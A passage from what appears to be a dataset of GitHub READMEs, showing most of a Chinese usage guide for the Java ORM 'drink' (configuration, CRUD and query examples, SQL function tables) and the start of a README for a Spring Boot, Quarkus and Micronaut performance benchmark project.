                         <path>
                             <groupId>io.github.kiryu1223</groupId>
                             <artifactId>drink-core</artifactId>
                             <version>${project.version}</version>
                         </path>
                     </annotationProcessorPaths>
                 </configuration>
             </plugin>
         </plugins>
     </build>
   ```
2. 配置config和yml

   ```yml
   # 这个名称与config类中的@Inject(""${ds1}"")对应
   ds1:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root
   # 这个名称与config类中的@Inject(""${ds2}"")对应
   ds2:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root
   # 这个名称与config类中的@Inject(""${ds3}"")对应
   ds3:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root

   # 这个名称与config类中的@Inject(""${dynamic}"")对应
   # 多数据源
   dynamic:
     type: com.zaxxer.hikari.HikariDataSource
     strict: true #严格模式（指定的源不存时：严格模式会抛异常；非严格模式用默认源）
     default: db_user_1 #指定默认数据源
     db_user_1:
       schema: db_user
       jdbcUrl: jdbc:mysql://localhost:3306/db_user?useUnicode=true&characterEncoding=utf8&autoReconnect=true&rewriteBatchedStatements=true
       driverClassName: com.mysql.cj.jdbc.Driver
       username: root
       password: 123456
     db_user_2:
       schema: db_user
       jdbcUrl: jdbc:mysql://localhost:3307/db_user?useUnicode=true&characterEncoding=utf8&autoReconnect=true&rewriteBatchedStatements=true
       driverClassName: com.mysql.cj.jdbc.Driver
       username: root
       password: 123456

   drink:
     # 这个名称代表了ioc容器中Client对象bean的别名，通过@Inject(""main"")注入到你想要的地方，下同
     main:
       database: MySQL
       # 这里需要一个config类中定义的的数据源的bean的别名，下同
       dsName: normalDs1
     sub:
       database: SqlServer
       dsName: normalDs2
     readonly:
       database: H2
       dsName: normalDs3
     dynamic:
       database: H2
       dsName: dynamicDs
   ```

   ```java
   package io.github.kiryu1223.app.config;

   import com.zaxxer.hikari.HikariDataSource;
   import org.noear.solon.annotation.Bean;
   import org.noear.solon.annotation.Configuration;
   import org.noear.solon.annotation.Inject;
   import org.noear.solon.data.dynamicds.DynamicDataSource;

   import javax.sql.DataSource;

   @Configuration
   public class MyConfig
   {
       @Bean(""normalDs1"")
       public DataSource dataSource1(@Inject(""${ds1}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""normalDs2"")
       public DataSource dataSource2(@Inject(""${ds2}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""normalDs3"")
       public DataSource dataSource3(@Inject(""${ds3}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""dynamicDs"")
       public DataSource dataSource4(@Inject(""${dynamic}"") DynamicDataSource dataSource)
       {
           return dataSource;
       }
   }
   ```

   注意，在只配了一个client对象的情况下，使用`@inject`注解在service或者你想要的地方注入Client对象时，不需要填入别名（否则会找不到报错）

3. 启动！

## 常用的注解

| 名称       | 参数                    | 说明                                                          |
|----------|-----------------------|-------------------------------------------------------------|
| `Column` | 参数1：数据库列名<br/>参数2：转换器 | Column注解用于类型的字段与数据库字段不一致的场合，或者是类型不一致需要转换的场合（java枚举<->数据库枚举） |
| `Table`  | 参数1：表名                | Table注解用于类名与表名不一致的场合                                        |

## CRUD

所有的增删查改操作都由DrinkClient对象完成（以下简称为client）

以下是主要使用的api

| 方法     | 参数             | 返回     |
|--------|----------------|--------|
| query  | 数据库表对应对象的class | 查询过程对象 |
| insert | 一个或者多个相同的表对应对象 | 新增过程对象 |
| update | 数据库表对应对象的class | 更新过程对象 |
| delete | 数据库表对应对象的class | 删除过程对象 |

### 查询

查询由client对象的query方法发起，query方法接收一个class对象，返回一个查询过程对象，
可以在后续调用`where` `group by` `limit`等方法添加查询条件

以下是常用的查询过程的api

| 方法          | 参数                                            | 返回                        | 说明                                                                                                                                                                            |
|-------------|-----------------------------------------------|---------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `leftJoin`  | 参数1：class对象或者LQuery对象<br/> 参数2：连接条件的lambda表达式 | 当前泛型数量+1的查询过程对象（因为连了一张新表） | 左连接                                                                                                                                                                           |
| `rightJoin` | 同leftJoin                                     | 同leftJoin                 | 右连接                                                                                                                                                                           |
| `innerJoin` | 同leftJoin                                     | 同leftJoin                 | 内连接                                                                                                                                                                           |
| `where`     | where条件的lambda表达式                             | this                      | where过滤条件，多个where默认使用and拼接                                                                                                                                                    |
| `orWhere`   | 同where                                        | this                      | 同where，区别是多个where使用or拼接                                                                                                                                                       |
| `groupBy`   | 返回单个元素或者包含多个元素的Grouper对象的lambda               | 组查询过程对象                   | 单个元素的group by时，可以直接类似于<br/>`a -> a.getId()`<br/>这样的lambda,多个元素时需要使用 <br/>a -> new Grouper()<br/>{ <br/>int id=a.getId();<br/>String name=a.getName();<br/>...<br/>} 这样的lambda |
| `having`    | having条件的lambda表达式                            | this                      | having过滤条件，多个having使用and连接                                                                                                                                                    |
| `orderBy`   | 参数1：需要排序的一个字段<br/>参数2：是否反向排序                  | this                      | 默认正序排序，有多个排序字段的需求时需要调用次orderBy方法                                                                                                                                              |
| `limit`     | rows或者offset和rows                             | this                      |                                                                                                                                                                               |
| `distinct`  | 无参或bool                                       | this                      | 无参调用时将distinct设置为true                                                                                                                                                         |
| `select `   | 无参select()或select(Vo.class)或select(lambda)    | 新查询过程对象                   | select代表一次查询过程的终结，在select之后调用任意条件api（例如where）都将把上一个查询过程视为中间表然后对中间表进行的查询                                                                                                       |
| `endSelect` | 需要返回的字段与返回类型                                  | 终结查询过程对象                  | 同select,区别是当需要返回单一的元素时（比如说`select(s -> s.getId())`），出于安全考虑强制要求使用endSelect（`endSelect(s -> s.getId())`）而非select                                                                |
| `toList`    |                                               | 查询返回的结果集                  | 多表查询时必须进行一次select之后才能进行返回结果集操作（因为多表情况下不知道到底要返回什么）                                                                                                                             |

假设我们有一个员工表

```java

@Data
@Table(""employees"")
public class Employee
{
    //员工id
    @Column(""emp_no"")
    private int number;
    //生日
    @Column(""birth_date"")
    private LocalDate birthDay;
    @Column(""first_name"")
    private String firstName;
    @Column(""last_name"")
    private String lastName;
    //性别
    @Column(converter = GenderConverter.class)
    private Gender gender;
    //入职日期
    @Column(""hire_date"")
    private LocalDate hireDay;
}
```

根据id获得员工对象

```java
public class DisplayTest extends BaseTest
{
    public void d1()
    {
        int id = 10001;
        List<Employee> list = client.query(Employee.class) // FROM `employees` AS t0
                .where(e -> e.getNumber() == id) // WHERE t0.`emp_no` = ?
                // 因为没有select，默认选择了全字段 
                // SELECT t0.`birth_date`,t0.`first_name`,t0.`last_name`,t0.`emp_no`,t0.`hire_date`,t0.`gender`
                .toList();
    }
}
```

对应的sql

```mysql
SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
FROM `employees` AS t0
WHERE t0.`emp_no` = ?
```

根据firstName和性别获得员工对象

```java
public class DisplayTest extends BaseTest
{
    public void d2()
    {
        List<Employee> list = client.query(Employee.class) // FROM `employees` AS t0
                .where(e -> e.getGender() == Gender.F && e.getFirstName() == ""lady"") // WHERE t0.`gender` = ? AND t0.`first_name` = ?
                // 因为没有select，默认选择了全字段 
                // SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
                .toList();
    }
}
```

对应的sql

```mysql
SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
FROM `employees` AS t0
WHERE t0.`gender` = ?
  AND t0.`first_name` = ?
```

假设我们还有一张员工薪资历史表

```java

@Data
@Table(""salaries"")
public class Salary
{
    //员工id
    @Column(""emp_no"")
    private int empNumber;
    //薪资
    private int salary;
    //何时开始的
    @Column(""from_date"")
    private LocalDate from;
    //何时为止的
    @Column(""to_date"")
    private LocalDate to;
}
```

查询一个员工的姓名和历史最高薪资和平均薪资

```java
public class DisplayTest extends BaseTest
{
    public void d3()
    {
        int id = 10001;
        List<? extends Result> list = client.query(Employee.class) // FROM `employees` AS t0
                .leftJoin(Salary.class, (e, s) -> e.getNumber() == s.getEmpNumber()) // LEFT JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
                .where((e, s) -> e.getNumber() == id) // WHERE t0.`emp_no` = ?
                // SELECT
                .select((e, s) -> new Result()
                {
                    // CONCAT(t0.`first_name`, ?, t0.`last_name`) AS `name` 
                    String name = SqlFunctions.concat(e.getFirstName(), "" "", e.getLastName());
                    // MAX(t1.`salary`)                           AS `maxSalary`,
                    int maxSalary = SqlFunctions.max(s.getSalary());
                    // AVG(t1.`salary`)                           AS `avgSalary`
                    BigDecimal avgSalary = SqlFunctions.avg(s.getSalary());
                })
                .toList();
    }
}
```

对应的sql

```mysql
SELECT CONCAT(t0.`first_name`, ?, t0.`last_name`) AS `name`,
       MAX(t1.`salary`)                           AS `maxSalary`,
       AVG(t1.`salary`)                           AS `avgSalary`
FROM `employees` AS t0
         LEFT JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
WHERE t0.`emp_no` = ?
```

假设我们还有部门表和员工部门中间表

```java

@Table(""departments"")
@Data
public class Department
{
    // 部门编号
    @Column(""dept_no"")
    private String number;
    // 部门名称
    @Column(""dept_name"")
    private String name;
}
```

```java

@Data
@Table(""dept_emp"")
public class DeptEmp
{
    // 员工编号
    @Column(""emp_no"")
    private int empNumber;
    // 部门编号
    @Column(""dept_no"")
    private String deptNumber;
    // 什么时候加入的
    @Column(""from_date"")
    private LocalDate from;
    // 什么时候离开的
    @Column(""to_date"")
    private LocalDate to;
}
```

查询某部门的员工的平均薪水

```java
public class DisplayTest extends BaseTest
{
    public void d4()
    {
        String departmentId = ""d009"";

        List<? extends Result> list = client.query(DeptEmp.class) // FROM `dept_emp` AS t0
                .innerJoin(Salary.class, (de, s) -> de.getEmpNumber() == s.getEmpNumber()) // INNER JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
                .innerJoin(Department.class, (de, s, d) -> de.getDeptNumber() == d.getNumber()) // INNER JOIN `departments` AS t2 ON t0.`dept_no` = t2.`dept_no`
                .where((de, s, d) -> de.getDeptNumber() == departmentId && s.getTo() == LocalDate.of(9999, 1, 1)) // WHERE t0.`dept_no` = ? AND t1.`to_date` = ?
                // GROUP BY 
                .groupBy((de, s, d) -> new Grouper()
                {
                    // t0.`dept_no`, 
                    String id = de.getDeptNumber();
                    // t2.`dept_name`
                    String name = d.getName();
                })
                // SELECT
                .select(g -> new Result()
                {
                    // t0.`dept_no` AS `deptId`
                    String deptId = g.key.id;
                    // t2.`dept_name` AS `deptName`
                    String deptName = g.key.name;
                    // AVG(t1.`salary`) AS `avgSalary`
                    BigDecimal avgSalary = g.avg((de, s, d) -> s.getSalary());
                })
                .toList();
    }
}
```

对应的sql

```mysql
SELECT t0.`dept_no` AS `deptId`, t2.`dept_name` AS `deptName`, AVG(t1.`salary`) AS `avgSalary`
FROM `dept_emp` AS t0
         INNER JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
         INNER JOIN `departments` AS t2 ON t0.`dept_no` = t2.`dept_no`
WHERE t0.`dept_no` = ?
  AND t1.`to_date` = ?
GROUP BY t0.`dept_no`, t2.`dept_name`
```

### 新增

新增由client对象的insert方法发起，insert方法接收一个或多个数据库表对应的对象，
返回一个新增过程对象,可以对这个新增过程对象后续进行insert方法添加更多数据

| 方法          | 参数           | 返回      | 说明             |
|-------------|--------------|---------|----------------|
| insert      | 同类型单个对象或对象集合 | this    | 添加更多需要传入数据库的对象 |
| executeRows |              | 执行成功的数量 | 执行insert       |

> 注意：insert根据数量自动选择批量执行（数量>=2）

Department表新增一个数据

```java
public class DisplayTest extends BaseTest
{
    public void i1()
    {
        Department department = new Department();
        department.setNumber(""101"");
        department.setName(""ddd"");

        client.insert(department).executeRows();
    }
}
```

新增多个数据

```java
public class DisplayTest extends BaseTest
{
    public void i2()
    {
        Department department1 = new Department();
        department1.setNumber(""101"");
        department1.setName(""ddd"");
        Department department2 = new Department();
        department2.setNumber(""102"");
        department2.setName(""eee"");
        Department department3 = new Department();
        department3.setNumber(""103"");
        department3.setName(""fff"");

        List<Department> list = Arrays.asList(department1, department2, department3);

        client.insert(list).executeRows();
    }
}
```

新增任意数据

```java
public class DisplayTest extends BaseTest
{
    public void i3()
    {
        Department d = new Department();

        Department department1 = new Department();
        department1.setNumber(""101"");
        department1.setName(""ddd"");
        Department department2 = new Department();
        department2.setNumber(""102"");
        department2.setName(""eee"");
        Department department3 = new Department();
        department3.setNumber(""103"");
        department3.setName(""fff"");

        List<Department> ds = Arrays.asList(department1, department2, department3);

        client.insert(d).insert(ds).executeRows();
    }
}
```

### 更新

更新由client对象的update方法发起，update方法接收一个class对象，返回一个更新过程对象，
可以对这个对象后续进行`set`设置数据和`where`限制更新范围等操作

| 方法                   | 参数               | 返回       | 说明                       |
|----------------------|------------------|----------|--------------------------|
| left/right/innerJoin | 同查询过程对象的leftJoin | 新的更新过程对象 | 用于连表更新，操作方式与查询时的join方法一致 |
| set                  | lambda表达式        | this     | 设置更新数据的lambda表达式         |
| where                | 同查询过程对象的where    | this     | 同查询过程对象的where            |

> 警告：进行无where限制下的update时默认会报错，需要手开启无视无where限制

为Department表更新数据

```java
public class UpdateTest extends BaseTest
{
    public void display0()
    {
        long l2 = client.update(Department.class)
                .set(s -> s.setName(""newName""))
                .where(w -> w.getNumber() == ""100"")
                .executeRows();
    }
}
```

对应sql

```mysql
UPDATE `departments` AS t0
SET t0.`dept_name` = ?
WHERE t0.`dept_no` = ?
```

连表更新

```java

@SuppressWarnings(""all"")
public class UpdateTest extends BaseTest
{
    long l = client.update(Department.class)
            .leftJoin(DeptEmp.class, (a, b) -> a.getNumber() == b.getDeptNumber())
            .set((a, b) -> a.setName(b.getDeptNumber()))
            .where((a, b) -> 1 == 1)
            .executeRows();
}
```

对应sql

```mysql
UPDATE `departments` AS t0 LEFT JOIN `dept_emp` AS t1 ON t0.`dept_no` = t1.`dept_no`
SET t0.`dept_name` = t1.`dept_no`
WHERE ? = ?
```

### 删除

删除由client对象的delete方法发起，delete方法接收一个class对象，返回一个删除过程对象，
可以对这个对象后续进行`where`限制更新范围等操作

| 方法                   | 参数                      | 返回       | 说明                                                |
|----------------------|-------------------------|----------|---------------------------------------------------|
| left/right/innerJoin | 同查询过程对象的leftJoin        | 新的删除过程对象 | 用于连表删除，操作方式与查询时的join方法一致                          |
| where                | 同查询过程对象的where           | this     | 同查询过程对象的where                                     |
| selectDelete         | 返回需要删除的目标表的对象的lambda表达式 | this     | join后连表删除时可以使用，用于指定需要删除的表，可以通过多次调用增加目标（无调用默认选择全部） |

> 警告：进行无where限制下的delete时默认会报错，需要手开启无视无where限制

为Department表删除数据

```java
public class DeleteTest extends BaseTest
{
    @Test
    public void d1()
    {
        long executeRows = client.delete(Department.class)
                .where(w -> w.getNumber() == ""10009"")
                .executeRows();
    }
}
```

对应sql

```mysql
DELETE
FROM `departments` AS t0
WHERE t0.`dept_no` = ?
```

连表删除

```java
public class DeleteTest extends BaseTest
{
    @Test
    public void d2()
    {
        String sql = client.delete(Department.class)
                .leftJoin(DeptEmp.class, (d, dm) -> d.getNumber() == dm.getDeptNumber())
                .where((d, dm) -> d.getNumber() == ""d009"")
//                .selectDeleteTable((d, dm) -> d)
                .selectDelete((d, dm) -> dm)
                .toSql();
        System.out.println(sql);
    }
}
```

对应sql

```mysql
DELETE t1
FROM `departments` AS t0
         LEFT JOIN `dept_emp` AS t1 ON t0.`dept_no` = t1.`dept_no`
WHERE t0.`dept_no` = ?
```

## 关联查询 INCLUDE

假设我们有一个工资类和一个员工类，员工类配置了对工资类的关联信息，员工与工资是一对多关系（一个员工有多个工资信息）

```java

@Data
@Table(value = ""salaries"")
public class Salary
{
    @Column(value = ""emp_no"", primaryKey = true)
    private int empNumber;
    private int salary;
    @Column(""from_date"")
    private LocalDate from;
    @Column(""to_date"")
    private LocalDate to;
}

@Data
@Table(""employees"")
public class Employee
{
   @Column(value = ""emp_no"",primaryKey = true)
   private int number;
   @Column(""birth_date"")
   private LocalDate birthDay;
   @Column(""first_name"")
   private String firstName;
   @Column(""last_name"")
   private String lastName;
   @Column(converter = GenderConverter.class)
   private Gender gender;
   @Column(""hire_date"")
   private LocalDate hireDay;
   // 一对多，self为自身的number字段，target为Salary的empNumber字段
   @Navigate(value = RelationType.OneToMany, self = ""number"", target = ""empNumber"")
   private List<Salary> salaries;
}
```

现在我们就可以填充指定的员工的工资信息

```java
public class IncludeTest extends BaseTest
{
    @Test
    public void oneManyTest()
    {
        //获取编号为10001的员工并且查询出该员工的所有工资信息
       Employee employee = client.query(Employee.class)
               .where(e -> e.getNumber() == 10001)
               .includes(e -> e.getSalaries())
               .first();

        Assert.assertEquals(17, employee.getSalaries().size());
    }
}
```

我们也可以对这个查询做出限制

```java
public class IncludeTest extends BaseTest
{
   @Test
   public void oneManyCondTest()
   {
      //获取编号为10001的员工并且查询出该员工最后一次调整工资（9999-01-01）以外的历史工资
      Employee employee = client.query(Employee.class)
              .where(e -> e.getNumber() == 10001)
              .includes(e -> e.getSalaries(), s -> s.getTo().isBefore(LocalDate.of(9999, 1, 1)))
              .first();

      Assert.assertEquals(16, employee.getSalaries().size());
   }
}
```

也支持更复杂的限制条件，比方说限制关联查询获取的条目数

```java
public class IncludeTest extends BaseTest
{
   @Test
   public void oneManyCond2Test()
   {
      //获取编号为10001的员工并且查询出该员工最后一次调整工资（9999-01-01）以外的历史工资
      //同时只获取前10条
      //并且按工资排序
      Employee employee = client.query(Employee.class)
              .includesByCond(e -> e.getSalaries(), query -> query
                      .orderBy(s -> s.getSalary())
                      .where(s -> s.getTo().isBefore(LocalDate.of(9999, 1, 1)))
                      .limit(10)
              )
              .first();
      
      Assert.assertEquals(10, employee.getSalaries().size());
   }
}
```

## 支持的sql函数

框架内部支持了绝大多数的常用sql函数，具体逻辑可以在SqlFunctions类中查看

`时间相关`

| 函数名            | 参数 | 返回类型                    | 功能                   |
|----------------|----|-------------------------|----------------------|
| now            |    | LocalDateTime           | 获取当前的日期时间            |
| utcNow         |    | LocalDateTime           | 获取当前的utc日期时间         |
| systemNow      |    | LocalDateTime           | 获取当前的系统日期时间          |
| nowDate        |    | LocalDate               | 获取当前的日期              |
| nowTime        |    | LocalTime               | 获取当前的时间              |
| utcNowDate     |    | LocalDate               | 获取当前的utc日期           |
| utcNowTime     |    | LocalTime               | 获取当前的utc时间           |
| addData        |    | LocalDate/LocalDateTime | 日期或日期时间增加指定的单位长度     |
| subDate        |    | LocalDate/LocalDateTime | 日期或日期时间减去指定的单位长度     |
| dateTimeDiff   |    | long                    | 获取两个日期或日期时间相差的指定单位的值 |
| dateFormat     |    | String                  | 格式化日期或日期时间           |
| getYear        |    | int                     | 提取年份                 |
| getMonth       |    | int                     | 提取月份                 |
| getWeek        |    | int                     | 提取周                  |
| getDay         |    | int                     | 提取日                  |
| getHour        |    | int                     | 提取小时                 |
| getMinute      |    | int                     | 提取日                  |
| getSecond      |    | int                     | 提取秒                  |
| getMilliSecond |    | int                     | 提取毫秒                 |
| getDayName     |    | String                  | 获取指定日期在本周周几的全名       |
| getDayOfWeek   |    | int                     | 获取指定日期在本周周几          |
| getDayOfYear   |    | int                     | 获取指定日期是当年的第几天        |
| dateToDays     |    | int                     | 从0000-01-01到指定日期的天数  |
| getLastDay     |    | LocalDate               | 获取本月最后一天的日期          |
| getMonthName   |    | String                  | 获取指定日期的月份名称          |
| getQuarter     |    | int                     | 获取指定日期在第几季度          |
| getWeekDay     |    | int                     | 获取指定日期在本周周几的索引       |
| getWeekOfYear  |    | int                     | 获取本周是今年的第几周          |

`数值相关`

| 函数名      | 参数           | 返回类型   | 功能                        |
|----------|--------------|--------|---------------------------|
| abs      |              | 同入参    |                           |
| cos      |              | double |                           |
| acos     |              | double |                           |
| sin      |              | double |                           |
| asin     |              | double |                           |
| tan      |              | double |                           |
| atan     |              | double |                           |
| atan2    |              | double |                           |
| ceil     |              | int    | 向上取整到最近的整数                |
| floor    |              | int    | 向下取整到最近的整数                |
| cot      |              | double | 余切函数                      |
| degrees  |              | double | 弧度转角度                     |
| radians  |              | double | 角度转弧度                     |
| exp      |              | double |                           |
| big      |              | 同入参    | 获取所有数值中最大的数值              |
| small    |              | 同入参    | 获取所有数值中最小的数值              |
| ln       |              | double |                           |
| log      |              | double |                           |
| log2     |              | double |                           |
| log10    |              | double |                           |
| mod      |              | 同入参    | 取模                        |
| pi       |              | double | 获取PI                      |
| pow      |              | double |                           |
| random   |              | double | 获取0-1的随机小数                |
| round    | (T a)        | int    | 四舍五入取整                    |
| round    | (T a, int b) | 同入参    | 指定截取多少位小数四舍五入取整           |
| sign     |              | int    | 参数为正数、负数和零时分别返回 1, -1 和 0 |
| sqrt     |              | double | 获取平方根                     |
| truncate | (T a)        | int    | 截断所有小数位                   |
| truncate | (T a, int b) | double | 截断指定位数的小数位                |

`字符串相关`

| 函数名          | 参数                                         | 返回类型   | 功能                            |
|--------------|--------------------------------------------|--------|-------------------------------|
| strToAscii   |                                            | int    | 第一个字符的ASCII码                  |
| asciiToStr   |                                            | String | ASCII码转字符串                    |
| length       |                                            | int    | 字符串的长度                        |
| byteLength   |                                            | int    | 字符串的字节长度                      |
| concat       |                                            | String | 拼接字符串                         |
| join         |                                            | String | 根据插值拼接字符串                     |
| numberFormat |                                            | String | 格式化数值                         |
| indexOf      | (String str, String subStr)                | int    | 返回一个字符串中指定子字符串的位置             |
| indexOf      | (String str, String subStr, int offset)    | int    | 返回一个字符串中指定子字符串的位置,并且指定起始搜索的位置 |
| toLowerCase  |                                            | String | 转小写                           |
| toUpperCase  |                                            | String | 转大写                           |
| left         |                                            | String | 返回具有指定长度的字符串的左边部分             |
| right        |                                            | String | 返回具有指定长度的字符串的右边部分             |
| leftPad      |                                            | String | 从左边开始对字符串进行重复填充，直到满足指定的长度     |
| rightPad     |                                            | String | 从右边开始对字符串进行重复填充，直到满足指定的长度     |
| trimStart    |                                            | String | 去除字符串左侧的空格                    |
| trimEnd      |                                            | String | 去除字符串右侧的空格                    |
| trim         |                                            | String | 去除字符串左侧和右侧的空格                 |
| replace      |                                            | String | 替换字符串中指定的字符为新字符               |
| reverse      |                                            | String | 反转字符串                         |
| compare      |                                            | int    | 比较字符串                         |
| subString    | (String str, int beginIndex)               | String | 获取子字符串                        |
| subString    | (String str, int beginIndex, int endIndex) | String | 获取子字符串                        |

`其他`

| 函数名       | 参数                                           | 返回类型 | 功能                                                                      |
|-----------|----------------------------------------------|------|-------------------------------------------------------------------------|
| If        | (boolean condition, T truePart, T falsePart) | T    | 如果condition为true则返回truePart，否则返回falsePart                               |
| ifNull    | (T valueNotNull, T valueIsNull)              | T    | 如果valueNotNull为null则返回valueIsNull，否则返回如果valueNotNull为null则返回valueIsNull |
| nullIf    | (T t1, T t2)                                 | T    | 如果t1 = t2则返回null，否则返回t1                                                 |
| cast      | (Object value, Class\<T> targetType)         | T    | 转换到指定类型                                                                 |
| cast      | (Object value, SqlTypes\<T> targetType)      | T    | 转换到指定类型                                                                 |
| isNull    | (T t)                                        | T    | isNull的快捷方法                                                             |
| isNotNull | (T t)                                        | T    | isNotNull的快捷方法                                                          |****

## java函数到sql表达式的映射

> 以下仅列举映射到mysql的情况，实际会根据数据库类型来决定策略

`String类`

| java                                | sql                              |       
|-------------------------------------|----------------------------------|
| this.contains(arg)                  | this LIKE CONCAT('%',arg,'%')    |
| this.startsWith(arg)                | this LIKE CONCAT(arg,'%')        |
| this.endsWith(arg)                  | this LIKE CONCAT('%',arg)        |
| this.length()                       | CHAR_LENGTH(this)                |
| this.toUpperCase()                  | UPPER(this)                      |
| this.toLowerCase()                  | LOWER(this)                      |
| this.concat(arg)                    | CONCAT(this,arg)                 |
| this.trim()                         | TRIM(this)                       |
| this.isEmpty()                      | (CHAR_LENGTH(this) = 0)          |
| this.indexOf(subStr)                | INSTR(this,subStr)               |
| this.indexOf(subStr,fromIndex)      | LOCATE(subStr,this,fromIndex)    |
| this.replace(oldStr,newStr)         | REPLACE(this,oldStr,newStr)      |
| this.substring(beginIndex)          | SUBSTR(this,beginIndex)          |
| this.substring(beginIndex,endIndex) | SUBSTR(this,beginIndex,endIndex) |
| String.join(delimiter,elements...)  | CONCAT_WS(delimiter,elements...) |

`Math类`

| java                | sql              |
|---------------------|------------------|
| Math.abs(arg)       | ABS(arg)         |
| Math.cos(arg)       | COS(arg)         |
| Math.acos(arg)      | ACOS(arg)        |
| Math.sin(arg)       | SIN(arg)         |
| Math.asin(arg)      | ASIN(arg)        |
| Math.tab(arg)       | TAN(arg)         |
| Math.atan(arg)      | ATAN(arg)        |
| Math.atan2(arg)     | ATAN2(arg)       |
| Math.toDegrees(arg) | DEGREES(arg)     |
| Math.toRadians(arg) | RADIANS(arg)     |
| Math.exp(arg)       | EXP(arg)         |
| Math.floor(arg)     | FLOOR(arg)       |
| Math.log(arg)       | LN(arg)          |
| Math.log10(arg)     | LOG10(arg)       |
| Math.random()       | RAND()           |
| Math.round(arg)     | ROUND(arg)       |
| Math.pow(arg1,arg2) | POWER(arg1,arg2) |
| Math.signum(arg)    | SIGN(arg)        |
| Math.sqrt(arg)      | SQRT(arg)        |

`List接口`

| java               | sql             |
|--------------------|-----------------|
| this.contains(arg) | arg IN (this,,) |

`BigDecimal类`

| java                | sql        |
|---------------------|------------|
| this.add(arg)       | this + arg |
| this.subtract(arg)  | this - arg |
| this.multiply(arg)  | this * arg |
| this.divide(arg)    | this / arg |
| this.remainder(arg) | this % arg |

`Temporal接口`

> LocalDate,LocalDateTime,LocalTime

| java               | sql        |
|--------------------|------------|
| this.isAfter(arg)  | this > arg |
| this.isBefore(arg) | this < arg |
| this.isEqual(arg)  | this = arg |
",0,0,1,0.0,"['database', 'mysql', 'true', 'inject', 'inject', 'inject', 'inject', 'dynamic', 'inject', 'main', 'crud', 'include']","['inject', 'database', 'mysql', 'true', 'dynamic']",11.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,8.0,3.0
ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads,main,"# web-reactive-jvm-native-cds-aot-virtual-threads

In this project, we will create six applications using [`Spring Boot`](https://docs.spring.io/spring-boot/index.html), [`Quarkus`](https://quarkus.io/), and [`Micronaut`](https://micronaut.io/) frameworks.

For each framework, we will implement one app with traditional blocking `Web` using `Apache Tomcat` and another app with non-blocking `Reactive` using `Netty`. We will also build both `JVM` and `Native` Docker images for the applications.

For the `Spring Boot` apps, we will build additional Docker images with different configurations, including enabling or not some Java optimizations like `Virtual Threads` ([`JEP 444`](https://openjdk.org/jeps/444)), `CDS` ([`JEP 310`](https://openjdk.org/jeps/310)), and `AOT` ([`JEP 295`](https://openjdk.org/jeps/295)).

## Proof-of-Concepts & Articles

On [ivangfr.github.io](https://ivangfr.github.io), I have compiled my Proof-of-Concepts (PoCs) and articles. You can easily search for the technology you are interested in by using the filter. Who knows, perhaps I have already implemented a PoC or written an article about what you are looking for.

## Additional Readings

### Spring Boot Performance Benchmark

- \[**Medium**\] [**Spring Boot Performance Benchmark: Web, Reactive, CDS, AOT, Virtual Threads, JVM, and Native**](https://medium.com/@ivangfr/spring-boot-performance-benchmark-web-reactive-cds-aot-virtual-threads-jvm-and-native-29295c8099b0)
- \[**Medium**\] [**Spring Boot 3.3.2 Benchmark: Web, Reactive, CDS, AOT, Virtual Threads, JVM, and Native**](https://medium.com/@ivangfr/spring-boot-3-3-2-benchmark-web-reactive-cds-aot-virtual-threads-jvm-and-native-42d3b704e88e)

### Java Frameworks Performance Benchmark

- \[**Medium**\] [**Java Frameworks Performance Benchmark: Spring Boot vs. Quarkus vs. Micronaut**](https://medium.com/@ivangfr/java-frameworks-performance-benchmark-spring-boot-vs-quarkus-vs-micronaut-028b6dbfef2e)
- \[**Medium**\] [**Performance Benchmark: Spring Boot 3.3.2 vs. Quarkus 3.13.2 vs. Micronaut 4.5.1**](https://medium.com/@ivangfr/performance-benchmark-spring-boot-3-3-2-vs-quarkus-3-13-2-vs-micronaut-4-5-1-515bae82d04f)

## Applications

- ### [spring-boot-greetings-api-web](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/spring-boot-greetings-api-web)
- ### [spring-boot-greetings-api-rective](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/spring-boot-greetings-api-reactive)
- ### [quarkus-greetings-api-web](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/quarkus-greetings-api-web)
- ### [quarkus-greetings-api-rective](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/quarkus-greetings-api-reactive)
- ### [micronaut-greetings-api-web](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/micronaut-greetings-api-web)
- ### [micronaut-greetings-api-rective](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/micronaut-greetings-api-reactive)

## Latest Framework Version Used

| Framework   | Version |
|-------------|---------|
| Quarkus     | 3.12.2  |
| Micronaut   | 4.5.1   |
| Spring Boot | 3.3.2   |

## Prerequisites

